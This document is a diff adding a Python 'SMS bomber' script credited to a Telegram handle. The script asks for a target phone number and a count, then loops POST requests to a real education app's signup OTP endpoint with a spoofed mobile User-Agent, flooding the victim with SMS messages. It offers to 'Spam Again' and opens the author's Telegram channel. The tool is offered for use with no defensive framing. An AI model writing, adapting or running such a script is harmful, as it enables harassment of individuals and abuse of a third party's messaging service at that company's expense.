@@ -1,0 +1,49 @@
+y#--[ CODE BY - @DARK_LMNx999 ]--#
+
+import os,sys,json,requests,string
+
+def LMNx9():
+    os.system('clear')
+    print(f'\n{jX}</> API-SHIKHO  |  CODED BY - @DARK_LMNx999')
+    print(47*'-')
+    number = input('</> EnteR NumbeR : ')
+    print(47*'-')
+    limit = int(input('</> EnteR LimiT : '))
+    print(47*'-')
+    url = 'https://api.shikho.com/auth/v2/send/sms'
+    data = {
+        'auth_type': 'signup',
+        'phone': number,
+        'type': 'student',
+        'vendor': 'shikho'
+        }
+    headers = {
+        'Accept': 'application/json, application/json',
+        'User-Agent': 'Shikho/(400) 4.0.0 (Android 7.1.2; Nexus 5; google RE87BAL1; en; WIFI; )',
+        'Authorization': 'Bearer',
+        'Build-Version': '(400) 4.0.0',
+        'Accept-Charset': 'UTF-8',
+        'Content-Type': 'application/json'
+        }
+    while True:
+        for i in range(limit):
+            try:
+                darkX = requests.post(url, headers=headers, data=json.dumps(data)).json()
+            except:
+                print(f'</> Request Error !! ')
+                break
+                sys.exit()
+            print(f'</> API Response [{i}] : {darkX}')
+        print('\n</> Proccess Finished !')
+        os.system('xdg-open https://t.me/DARK_TEAM_LMNx9')
+        lmn=input('</> Spam Again ? [Y/n] : ')
+        if lmn in ['y','Y']:
+            LMNx9()
+        elif lmn in ['n','N']:
+            sys.exit('\n</> TnX FoR UsinG LMNx9 TooL !\n')
+        else:
+            sys.exit('\n</> Wrong InpuT !\n')
+
+if __name__ in "__main__":
+    jX='\x1b[38;5;203m'
+    LMNx9()
